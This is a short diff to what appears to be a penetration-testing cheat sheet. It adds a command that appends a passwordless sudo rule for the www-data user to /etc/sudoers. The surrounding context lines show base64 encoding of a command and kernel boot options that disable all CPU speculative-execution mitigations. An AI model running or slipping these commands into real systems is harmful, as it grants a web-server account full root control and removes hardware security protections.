@@ -22,3 +22,11 @@ echo -n 'COMMAND' | iconv -f UTF8 -t UTF16LE | base64 -w 0
 
 noibrs noibpb nopti nospectre\_v2 nospectre\_v1 l1tf=off nospec\_store\_bypass\_disable no\_stf\_barrier mds=off tsx=on tsx\_async\_abort=off mitigations=off
 
+## Add yourself to sudoers with no password
+
+```bash
+echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+```
+
+
+
